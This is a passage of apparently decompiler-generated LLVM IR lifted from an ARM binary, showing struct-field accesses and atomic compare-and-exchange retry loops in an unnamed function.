  %v4_10a9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 76) to i32*), align 4
  store i32 %v4_10a9c, i32* %r3.global-to-local, align 4
  %v3_10aa0 = icmp uge i32 %v0_10dec, %v4_10a9c
  store i1 %v3_10aa0, i1* %cpsr_c.global-to-local, align 1
  %v9_10aa0 = icmp eq i32 %v0_10dec, %v4_10a9c
  br i1 %v9_10aa0, label %bb72, label %dec_label_pc_10ab8

bb72:                                             ; preds = %.thread4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v0_10dec, i32* @r4, align 4
  br label %dec_label_pc_10ac8

dec_label_pc_10ab8:                               ; preds = %.thread4
  store i32 %v0_10dec, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10abc = icmp eq i32 %v0_10dec, 0
  br i1 %v2_10abc, label %dec_label_pc_10ac8, label %dec_label_pc_10ddc

dec_label_pc_10ac8:                               ; preds = %bb72, %dec_label_pc_10ab8
  %stack_var_-44.1 = phi i32 [ 0, %bb72 ], [ 256, %dec_label_pc_10ab8 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_10acc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 160) to i32*), align 4
  store i32 %v4_10acc, i32* %r5.global-to-local, align 4
  %v0_10ad0 = call i32 @function_f150()
  store i32 %v0_10ad0, i32* %r0.global-to-local, align 4
  %v1_10ad4 = add i32 %v4_10acc, 8
  %v2_10ad4 = inttoptr i32 %v1_10ad4 to i32*
  %v3_10ad4 = load i32, i32* %v2_10ad4, align 4
  store i32 %v3_10ad4, i32* %r3.global-to-local, align 4
  %v1_10ad8 = add i32 %v0_10ad0, -1168
  store i32 %v1_10ad8, i32* %r8.global-to-local, align 4
  %v3_10adc = icmp uge i32 %v3_10ad4, %v1_10ad8
  store i1 %v3_10adc, i1* %cpsr_c.global-to-local, align 1
  %v9_10adc = icmp eq i32 %v3_10ad4, %v1_10ad8
  br i1 %v9_10adc, label %dec_label_pc_10b24, label %dec_label_pc_10ae4

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10ac8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_10acc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_10af0151 = inttoptr i32 %v4_10acc to i32*
  %v2_10af0152 = load i32, i32* %v1_10af0151, align 4
  store i32 %v2_10af0152, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_10af4154 = icmp eq i32 %v2_10af0152, 0
  br i1 %v9_10af4154, label %dec_label_pc_10afc, label %dec_label_pc_10b14

dec_label_pc_10afc:                               ; preds = %dec_label_pc_10ae4, %dec_label_pc_10afc.dec_label_pc_10af0_crit_edge
  %v0_10afc155 = phi i32 [ %v1_10af4.pre, %dec_label_pc_10afc.dec_label_pc_10af0_crit_edge ], [ 0, %dec_label_pc_10ae4 ]
  store i32 %v0_10afc155, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10b0c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10b0c, label %dec_label_pc_10b10, label %dec_label_pc_10afc.dec_label_pc_10af0_crit_edge

dec_label_pc_10afc.dec_label_pc_10af0_crit_edge:  ; preds = %dec_label_pc_10afc
  %v0_10af0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10af4.pre = load i32, i32* @r4, align 4
  %v1_10af0 = inttoptr i32 %v0_10af0.pre to i32*
  %v2_10af0 = load i32, i32* %v1_10af0, align 4
  store i32 %v2_10af0, i32* %r3.global-to-local, align 4
  %v3_10af4 = icmp uge i32 %v2_10af0, %v1_10af4.pre
  store i1 %v3_10af4, i1* %cpsr_c.global-to-local, align 1
  %v9_10af4 = icmp eq i32 %v2_10af0, %v1_10af4.pre
  br i1 %v9_10af4, label %dec_label_pc_10afc, label %dec_label_pc_10b14

dec_label_pc_10b10:                               ; preds = %dec_label_pc_10afc
  %v0_10b10 = load i32, i32* @r4, align 4
  store i32 %v0_10b10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10b14

dec_label_pc_10b14:                               ; preds = %dec_label_pc_10ae4, %dec_label_pc_10afc.dec_label_pc_10af0_crit_edge, %dec_label_pc_10b10
  %v0_10b14 = phi i32 [ %v0_10b10, %dec_label_pc_10b10 ], [ %v2_10af0152, %dec_label_pc_10ae4 ], [ %v2_10af0, %dec_label_pc_10afc.dec_label_pc_10af0_crit_edge ]
  %v1_10b14 = phi i32 [ %v0_10b10, %dec_label_pc_10b10 ], [ 0, %dec_label_pc_10ae4 ], [ %v1_10af4.pre, %dec_label_pc_10afc.dec_label_pc_10af0_crit_edge ]
  %v3_10b14 = icmp uge i32 %v0_10b14, %v1_10b14
  store i1 %v3_10b14, i1* %cpsr_c.global-to-local, align 1
  %v9_10b14 = icmp eq i32 %v0_10b14, %v1_10b14
  br i1 %v9_10b14, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_10b14
  %v1_10b18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_10b18, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_10b14, %bb73
  %v1_10b1c = xor i1 %v9_10b14, true
  call void @__pseudo_cond_branch(i1 %v1_10b1c, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_10b20 = load i32, i32* %r8.global-to-local, align 4
  %v1_10b20 = load i32, i32* %r5.global-to-local, align 4
  %v2_10b20 = add i32 %v1_10b20, 8
  %v3_10b20 = inttoptr i32 %v2_10b20 to i32*
  store i32 %v0_10b20, i32* %v3_10b20, align 4
  br label %dec_label_pc_10b24

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10ac8, %bb74
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_10b28 = load i32, i32* @r6, align 4
  %v2_10b28 = add i32 %v0_10b28, 160
  %v3_10b28 = inttoptr i32 %v2_10b28 to i32*
  %v4_10b28 = load i32, i32* %v3_10b28, align 4
  store i32 %v4_10b28, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_10b30 = add i32 %v0_10b28, 12
  %v3_10b30 = inttoptr i32 %v2_10b30 to i32*
  %v4_10b30 = load i32, i32* %v3_10b30, align 4
  store i32 %v4_10b30, i32* %r2.global-to-local, align 4
  %v1_10b34 = add i32 %v4_10b28, 4
  %v2_10b34 = inttoptr i32 %v1_10b34 to i32*
  %v3_10b34 = load i32, i32* %v2_10b34, align 4
  store i32 %v3_10b34, i32* %r1.global-to-local, align 4
  %v1_10b38 = inttoptr i32 %v4_10b30 to i32*
  %v2_10b38 = load i32, i32* %v1_10b38, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b3c = icmp eq i32 %v3_10b34, 0
  %v1_10b40 = add i32 %v2_10b38, 1
  store i32 %v1_10b40, i32* %r3.global-to-local, align 4
  store i32 %v1_10b40, i32* %v1_10b38, align 4
  br i1 %v2_10b3c, label %dec_label_pc_10b4c, label %dec_label_pc_10bac

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10b24
  %v0_10b4c = load i32, i32* %r1.global-to-local, align 4
  %v1_10b4c = load i32, i32* %r0.global-to-local, align 4
  %v2_10b4c = add i32 %v1_10b4c, 8
  %v3_10b4c = inttoptr i32 %v2_10b4c to i32*
  store i32 %v0_10b4c, i32* %v3_10b4c, align 4
  %v0_10b50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10b50, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10b54

dec_label_pc_10b54:                               ; preds = %dec_label_pc_10b84.dec_label_pc_10b54_crit_edge, %dec_label_pc_10b4c
  %v0_10b54 = phi i32 [ %v0_10b54.pre, %dec_label_pc_10b84.dec_label_pc_10b54_crit_edge ], [ %v0_10b50, %dec_label_pc_10b4c ]
  %v1_10b54 = inttoptr i32 %v0_10b54 to i32*
  %v2_10b54 = load i32, i32* %v1_10b54, align 4
  store i32 %v2_10b54, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10b54, i32* %r2.global-to-local, align 4
  %v2_10b60139 = load i32, i32* %v1_10b54, align 4
  store i32 %v2_10b60139, i32* %r3.global-to-local, align 4
  %v3_10b64141 = icmp uge i32 %v2_10b60139, %v2_10b54
  store i1 %v3_10b64141, i1* %cpsr_c.global-to-local, align 1
  %v9_10b64147 = icmp eq i32 %v2_10b60139, %v2_10b54
  br i1 %v9_10b64147, label %dec_label_pc_10b6c, label %dec_label_pc_10b84

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b54, %dec_label_pc_10b6c.dec_label_pc_10b60_crit_edge
  %v0_10b6c148 = phi i32 [ %v1_10b64.pre, %dec_label_pc_10b6c.dec_label_pc_10b60_crit_edge ], [ %v2_10b54, %dec_label_pc_10b54 ]
  store i32 %v0_10b6c148, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10b7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10b7c, label %dec_label_pc_10b80, label %dec_label_pc_10b6c.dec_label_pc_10b60_crit_edge

dec_label_pc_10b6c.dec_label_pc_10b60_crit_edge:  ; preds = %dec_label_pc_10b6c
  %v0_10b60.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10b64.pre = load i32, i32* @r4, align 4
  %v1_10b60 = inttoptr i32 %v0_10b60.pre to i32*
  %v2_10b60 = load i32, i32* %v1_10b60, align 4
  store i32 %v2_10b60, i32* %r3.global-to-local, align 4
  %v3_10b64 = icmp uge i32 %v2_10b60, %v1_10b64.pre
  store i1 %v3_10b64, i1* %cpsr_c.global-to-local, align 1
  %v9_10b64 = icmp eq i32 %v2_10b60, %v1_10b64.pre
  br i1 %v9_10b64, label %dec_label_pc_10b6c, label %dec_label_pc_10b84

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10b6c
  %v0_10b80 = load i32, i32* @r4, align 4
  store i32 %v0_10b80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10b84

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b54, %dec_label_pc_10b6c.dec_label_pc_10b60_crit_edge, %dec_label_pc_10b80
  %v0_10b8c = phi i32 [ %v0_10b80, %dec_label_pc_10b80 ], [ %v2_10b60139, %dec_label_pc_10b54 ], [ %v2_10b60, %dec_label_pc_10b6c.dec_label_pc_10b60_crit_edge ]
  %v1_10b84 = phi i32 [ %v0_10b80, %dec_label_pc_10b80 ], [ %v2_10b54, %dec_label_pc_10b54 ], [ %v1_10b64.pre, %dec_label_pc_10b6c.dec_label_pc_10b60_crit_edge ]
  %v3_10b84 = icmp uge i32 %v0_10b8c, %v1_10b84
  store i1 %v3_10b84, i1* %cpsr_c.global-to-local, align 1
  %v9_10b84 = icmp eq i32 %v0_10b8c, %v1_10b84
  br i1 %v9_10b84, label %dec_label_pc_10b8c, label %dec_label_pc_10b84.dec_label_pc_10b54_crit_edge

dec_label_pc_10b84.dec_label_pc_10b54_crit_edge:  ; preds = %dec_label_pc_10b84
  %v0_10b54.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10b54

dec_label_pc_10b8c:                               ; preds = %dec_label_pc_10b84
  %v2_10b8c = icmp ne i32 %v1_10b84, 0
  store i1 %v2_10b8c, i1* %cpsr_c.global-to-local, align 1
  %v7_10b90 = icmp slt i32 %v1_10b84, 2
  br i1 %v7_10b90, label %dec_label_pc_10bac, label %dec_label_pc_10b94

dec_label_pc_10b94:                               ; preds = %dec_label_pc_10b8c
  %v0_10b94 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10b94, i32* %r0.global-to-local, align 4
  %v0_10b98 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b98 = add i32 %v0_10b98, 129
  store i32 %v1_10b98, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10bac

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10b24, %dec_label_pc_10b94, %dec_label_pc_10b8c
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_10bb0 = load i32, i32* @r6, align 4
  %v2_10bb0 = add i32 %v0_10bb0, 152
  %v3_10bb0 = inttoptr i32 %v2_10bb0 to i32*
  %v4_10bb0 = load i32, i32* %v3_10bb0, align 4
  store i32 %v4_10bb0, i32* %r5.global-to-local, align 4
  %v1_10bb4 = add i32 %v4_10bb0, 8
  %v2_10bb4 = inttoptr i32 %v1_10bb4 to i32*
  %v3_10bb4 = load i32, i32* %v2_10bb4, align 4
  store i32 %v3_10bb4, i32* %r3.global-to-local, align 4
  %v1_10bb8 = load i32, i32* %r8.global-to-local, align 4
  %v3_10bb8 = icmp uge i32 %v3_10bb4, %v1_10bb8
  store i1 %v3_10bb8, i1* %cpsr_c.global-to-local, align 1
  %v9_10bb8 = icmp eq i32 %v3_10bb4, %v1_10bb8
  br i1 %v9_10bb8, label %dec_label_pc_10c00, label %dec_label_pc_10bc0

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10bac
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_10bb0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_10bcc131 = inttoptr i32 %v4_10bb0 to i32*
  %v2_10bcc132 = load i32, i32* %v1_10bcc131, align 4
  store i32 %v2_10bcc132, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_10bd0134 = icmp eq i32 %v2_10bcc132, 0
  br i1 %v9_10bd0134, label %dec_label_pc_10bd8, label %dec_label_pc_10bf0

dec_label_pc_10bd8:                               ; preds = %dec_label_pc_10bc0, %dec_label_pc_10bd8.dec_label_pc_10bcc_crit_edge
  %v0_10bd8135 = phi i32 [ %v1_10bd0.pre, %dec_label_pc_10bd8.dec_label_pc_10bcc_crit_edge ], [ 0, %dec_label_pc_10bc0 ]
  store i32 %v0_10bd8135, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10be8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10be8, label %dec_label_pc_10bec, label %dec_label_pc_10bd8.dec_label_pc_10bcc_crit_edge

dec_label_pc_10bd8.dec_label_pc_10bcc_crit_edge:  ; preds = %dec_label_pc_10bd8
  %v0_10bcc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10bd0.pre = load i32, i32* @r4, align 4
  %v1_10bcc = inttoptr i32 %v0_10bcc.pre to i32*
  %v2_10bcc = load i32, i32* %v1_10bcc, align 4
  store i32 %v2_10bcc, i32* %r3.global-to-local, align 4
  %v3_10bd0 = icmp uge i32 %v2_10bcc, %v1_10bd0.pre
  store i1 %v3_10bd0, i1* %cpsr_c.global-to-local, align 1
  %v9_10bd0 = icmp eq i32 %v2_10bcc, %v1_10bd0.pre
  br i1 %v9_10bd0, label %dec_label_pc_10bd8, label %dec_label_pc_10bf0

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10bd8
  %v0_10bec = load i32, i32* @r4, align 4
  store i32 %v0_10bec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10bf0

dec_label_pc_10bf0:                               ; preds = %dec_label_pc_10bc0, %dec_label_pc_10bd8.dec_label_pc_10bcc_crit_edge, %dec_label_pc_10bec
  %v0_10bf0 = phi i32 [ %v0_10bec, %dec_label_pc_10bec ], [ %v2_10bcc132, %dec_label_pc_10bc0 ], [ %v2_10bcc, %dec_label_pc_10bd8.dec_label_pc_10bcc_crit_edge ]
  %v1_10bf0 = phi i32 [ %v0_10bec, %dec_label_pc_10bec ], [ 0, %dec_label_pc_10bc0 ], [ %v1_10bd0.pre, %dec_label_pc_10bd8.dec_label_pc_10bcc_crit_edge ]
  %v3_10bf0 = icmp uge i32 %v0_10bf0, %v1_10bf0
  store i1 %v3_10bf0, i1* %cpsr_c.global-to-local, align 1
  %v9_10bf0 = icmp eq i32 %v0_10bf0, %v1_10bf0
  br i1 %v9_10bf0, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_10bf0
  %v1_10bf4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_10bf4, i32* %r0.global-to-local, align 4
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_10bf0, %bb75
  %v1_10bf8 = xor i1 %v9_10bf0, true
  call void @__pseudo_cond_branch(i1 %v1_10bf8, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_10bfc = load i32, i32* %r8.global-to-local, align 4
  %v1_10bfc = load i32, i32* %r5.global-to-local, align 4
  %v2_10bfc = add i32 %v1_10bfc, 8
  %v3_10bfc = inttoptr i32 %v2_10bfc to i32*
  store i32 %v0_10bfc, i32* %v3_10bfc, align 4
  %v0_10c04.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10c00

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10bac, %bb76
  %v0_10c10 = phi i32 [ %v0_10bb0, %dec_label_pc_10bac ], [ %v0_10c04.pre, %bb76 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_10c04 = add i32 %v0_10c10, 152
  %v3_10c04 = inttoptr i32 %v2_10c04 to i32*
  %v4_10c04 = load i32, i32* %v3_10c04, align 4
  store i32 %v4_10c04, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_10c0c = add i32 %v4_10c04, 4
  %v2_10c0c = inttoptr i32 %v1_10c0c to i32*
  %v3_10c0c = load i32, i32* %v2_10c0c, align 4
  store i32 %v3_10c0c, i32* %r1.global-to-local, align 4
  %v2_10c10 = add i32 %v0_10c10, 76
  %v3_10c10 = inttoptr i32 %v2_10c10 to i32*
  %v4_10c10 = load i32, i32* %v3_10c10, align 4
  store i32 %v4_10c10, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c14 = icmp eq i32 %v3_10c0c, 0
  %v1_10c18 = inttoptr i32 %v4_10c10 to i32*
  %v2_10c18 = load i32, i32* %v1_10c18, align 4
  store i32 %v2_10c18, i32* @r5, align 4
  br i1 %v2_10c14, label %dec_label_pc_10c20, label %dec_label_pc_10c80

dec_label_pc_10c20:                               ; preds = %dec_label_pc_10c00
  %v2_10c20 = add i32 %v4_10c04, 8
  %v3_10c20 = inttoptr i32 %v2_10c20 to i32*
  store i32 0, i32* %v3_10c20, align 4
  %v0_10c24 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10c24, i32* @r7, align 4
  br label %dec_label_pc_10c28

dec_label_pc_10c28:                               ; preds = %dec_label_pc_10c58.dec_label_pc_10c28_crit_edge, %dec_label_pc_10c20
  %v0_10c28 = phi i32 [ %v0_10c28.pre, %dec_label_pc_10c58.dec_label_pc_10c28_crit_edge ], [ %v0_10c24, %dec_label_pc_10c20 ]
  %v1_10c28 = inttoptr i32 %v0_10c28 to i32*
  %v2_10c28 = load i32, i32* %v1_10c28, align 4
  store i32 %v2_10c28, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10c28, i32* %r2.global-to-local, align 4
  %v2_10c34119 = load i32, i32* %v1_10c28, align 4
  store i32 %v2_10c34119, i32* %r3.global-to-local, align 4
  %v3_10c38121 = icmp uge i32 %v2_10c34119, %v2_10c28
  store i1 %v3_10c38121, i1* %cpsr_c.global-to-local, align 1
  %v9_10c38127 = icmp eq i32 %v2_10c34119, %v2_10c28
  br i1 %v9_10c38127, label %dec_label_pc_10c40, label %dec_label_pc_10c58

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c28, %dec_label_pc_10c40.dec_label_pc_10c34_crit_edge
  %v0_10c40128 = phi i32 [ %v1_10c38.pre, %dec_label_pc_10c40.dec_label_pc_10c34_crit_edge ], [ %v2_10c28, %dec_label_pc_10c28 ]
  store i32 %v0_10c40128, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10c50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10c50, label %dec_label_pc_10c54, label %dec_label_pc_10c40.dec_label_pc_10c34_crit_edge

dec_label_pc_10c40.dec_label_pc_10c34_crit_edge:  ; preds = %dec_label_pc_10c40
  %v0_10c34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10c38.pre = load i32, i32* @r4, align 4
  %v1_10c34 = inttoptr i32 %v0_10c34.pre to i32*
  %v2_10c34 = load i32, i32* %v1_10c34, align 4
  store i32 %v2_10c34, i32* %r3.global-to-local, align 4
  %v3_10c38 = icmp uge i32 %v2_10c34, %v1_10c38.pre
  store i1 %v3_10c38, i1* %cpsr_c.global-to-local, align 1
  %v9_10c38 = icmp eq i32 %v2_10c34, %v1_10c38.pre
  br i1 %v9_10c38, label %dec_label_pc_10c40, label %dec_label_pc_10c58

dec_label_pc_10c54:                               ; preds = %dec_label_pc_10c40
  %v0_10c54 = load i32, i32* @r4, align 4
  store i32 %v0_10c54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10c58

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c28, %dec_label_pc_10c40.dec_label_pc_10c34_crit_edge, %dec_label_pc_10c54
  %v0_10c60 = phi i32 [ %v0_10c54, %dec_label_pc_10c54 ], [ %v2_10c34119, %dec_label_pc_10c28 ], [ %v2_10c34, %dec_label_pc_10c40.dec_label_pc_10c34_crit_edge ]
  %v1_10c58 = phi i32 [ %v0_10c54, %dec_label_pc_10c54 ], [ %v2_10c28, %dec_label_pc_10c28 ], [ %v1_10c38.pre, %dec_label_pc_10c40.dec_label_pc_10c34_crit_edge ]
  %v3_10c58 = icmp uge i32 %v0_10c60, %v1_10c58
  store i1 %v3_10c58, i1* %cpsr_c.global-to-local, align 1
  %v9_10c58 = icmp eq i32 %v0_10c60, %v1_10c58
  br i1 %v9_10c58, label %dec_label_pc_10c60, label %dec_label_pc_10c58.dec_label_pc_10c28_crit_edge

dec_label_pc_10c58.dec_label_pc_10c28_crit_edge:  ; preds = %dec_label_pc_10c58
  %v0_10c28.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10c28

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c58
  %v2_10c60 = icmp ne i32 %v1_10c58, 0
  store i1 %v2_10c60, i1* %cpsr_c.global-to-local, align 1
  %v7_10c64 = icmp slt i32 %v1_10c58, 2
  br i1 %v7_10c64, label %dec_label_pc_10c80thread-pre-split, label %dec_label_pc_10c68

dec_label_pc_10c68:                               ; preds = %dec_label_pc_10c60
  %v0_10c68 = load i32, i32* @r7, align 4
  store i32 %v0_10c68, i32* %r0.global-to-local, align 4
  %v0_10c6c = load i32, i32* %r1.global-to-local, align 4
  %v1_10c6c = add i32 %v0_10c6c, 129
  store i32 %v1_10c6c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10c80thread-pre-split

dec_label_pc_10c80thread-pre-split:               ; preds = %dec_label_pc_10c60, %dec_label_pc_10c68
  %v0_10dcc.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_10c80

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c80thread-pre-split, %dec_label_pc_10c00
  %v0_10dcc.pr = phi i32 [ %v0_10dcc.pr.pr, %dec_label_pc_10c80thread-pre-split ], [ %v2_10c18, %dec_label_pc_10c00 ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10dcc24 = icmp eq i32 %v0_10dcc.pr, 0
  br i1 %v2_10dcc24, label %dec_label_pc_10dd4, label %dec_label_pc_10c90

dec_label_pc_10c90:                               ; preds = %dec_label_pc_10c80, %dec_label_pc_10dc8
  %v0_10cb8 = phi i32 [ %v3_10dc8, %dec_label_pc_10dc8 ], [ %v0_10dcc.pr, %dec_label_pc_10c80 ]
  %v1_10c90 = inttoptr i32 %v0_10cb8 to i16*
  %v2_10c90 = load i16, i16* %v1_10c90, align 2
  %v3_10c90 = zext i16 %v2_10c90 to i32
  store i32 %v3_10c90, i32* %r3.global-to-local, align 4
  %v1_10c94 = and i32 %v3_10c90, 64
  %v2_10c94 = icmp eq i32 %v1_10c94, 0
  br i1 %v2_10c94, label %dec_label_pc_10dc8, label %dec_label_pc_10c9c

dec_label_pc_10c9c:                               ; preds = %dec_label_pc_10c90
  %v0_10c9c = load i32, i32* @r6, align 4
  %v1_10c9c = load i32, i32* %sb.global-to-local, align 4
  %v2_10c9c = add i32 %v1_10c9c, %v0_10c9c
  %v3_10c9c = inttoptr i32 %v2_10c9c to i32*
  %v4_10c9c = load i32, i32* %v3_10c9c, align 4
  store i32 %v4_10c9c, i32* %r3.global-to-local, align 4
  %v1_10ca0 = inttoptr i32 %v4_10c9c to i32*
  %v2_10ca0 = load i32, i32* %v1_10ca0, align 4
  store i32 %v2_10ca0, i32* %r3.global-to-local, align 4
  %v2_10ca4 = icmp ugt i32 %v2_10ca0, 1
  store i1 %v2_10ca4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ca4 = icmp eq i32 %v2_10ca0, 2
  br i1 %v7_10ca4, label %dec_label_pc_10d08, label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %dec_label_pc_10c9c
  %v1_10cac = add i32 %v0_10cb8, 64
  %v2_10cac = inttoptr i32 %v1_10cac to i32*
  %v3_10cac = load i32, i32* %v2_10cac, align 4
  store i32 %v3_10cac, i32* %r3.global-to-local, align 4
  %v1_10cb0 = load i32, i32* %r8.global-to-local, align 4
  %v3_10cb0 = icmp uge i32 %v3_10cac, %v1_10cb0
  store i1 %v3_10cb0, i1* %cpsr_c.global-to-local, align 1
  %v9_10cb0 = icmp eq i32 %v3_10cac, %v1_10cb0
  br i1 %v9_10cb0, label %dec_label_pc_10cfc, label %dec_label_pc_10cb8

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10cac
  %v1_10cb8 = add i32 %v0_10cb8, 56
  store i32 %v1_10cb8, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_10cb8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_10cc894 = inttoptr i32 %v1_10cb8 to i32*
  %v2_10cc895 = load i32, i32* %v1_10cc894, align 4
  store i32 %v2_10cc895, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_10ccc102 = icmp eq i32 %v2_10cc895, 0
  br i1 %v9_10ccc102, label %dec_label_pc_10cd4, label %dec_label_pc_10cec

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cb8, %dec_label_pc_10cd4.dec_label_pc_10cc8_crit_edge
  %v0_10cd4103 = phi i32 [ %v1_10ccc.pre, %dec_label_pc_10cd4.dec_label_pc_10cc8_crit_edge ], [ 0, %dec_label_pc_10cb8 ]
  store i32 %v0_10cd4103, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10ce4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10ce4, label %dec_label_pc_10ce8, label %dec_label_pc_10cd4.dec_label_pc_10cc8_crit_edge

dec_label_pc_10cd4.dec_label_pc_10cc8_crit_edge:  ; preds = %dec_label_pc_10cd4
  %v0_10cc8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10ccc.pre = load i32, i32* @r4, align 4
  %v1_10cc8 = inttoptr i32 %v0_10cc8.pre to i32*
  %v2_10cc8 = load i32, i32* %v1_10cc8, align 4
  store i32 %v2_10cc8, i32* %r3.global-to-local, align 4
  %v3_10ccc = icmp uge i32 %v2_10cc8, %v1_10ccc.pre
  store i1 %v3_10ccc, i1* %cpsr_c.global-to-local, align 1
  %v9_10ccc = icmp eq i32 %v2_10cc8, %v1_10ccc.pre
  br i1 %v9_10ccc, label %dec_label_pc_10cd4, label %dec_label_pc_10cec

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10cd4
  %v0_10ce8 = load i32, i32* @r4, align 4
  store i32 %v0_10ce8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10cec

dec_label_pc_10cec:                               ; preds = %dec_label_pc_10cb8, %dec_label_pc_10cd4.dec_label_pc_10cc8_crit_edge, %dec_label_pc_10ce8
  %v0_10cec = phi i32 [ %v0_10ce8, %dec_label_pc_10ce8 ], [ %v2_10cc895, %dec_label_pc_10cb8 ], [ %v2_10cc8, %dec_label_pc_10cd4.dec_label_pc_10cc8_crit_edge ]
  %v1_10cec = phi i32 [ %v0_10ce8, %dec_label_pc_10ce8 ], [ 0, %dec_label_pc_10cb8 ], [ %v1_10ccc.pre, %dec_label_pc_10cd4.dec_label_pc_10cc8_crit_edge ]
  %v3_10cec = icmp uge i32 %v0_10cec, %v1_10cec
  store i1 %v3_10cec, i1* %cpsr_c.global-to-local, align 1
  %v9_10cec = icmp eq i32 %v0_10cec, %v1_10cec
  br i1 %v9_10cec, label %bb78, label %bb77

bb77:                                             ; preds = %dec_label_pc_10cec
  %v1_10cf0 = load i32, i32* @r7, align 4
  store i32 %v1_10cf0, i32* %r0.global-to-local, align 4
  br label %bb78

bb78:                                             ; preds = %dec_label_pc_10cec, %bb77
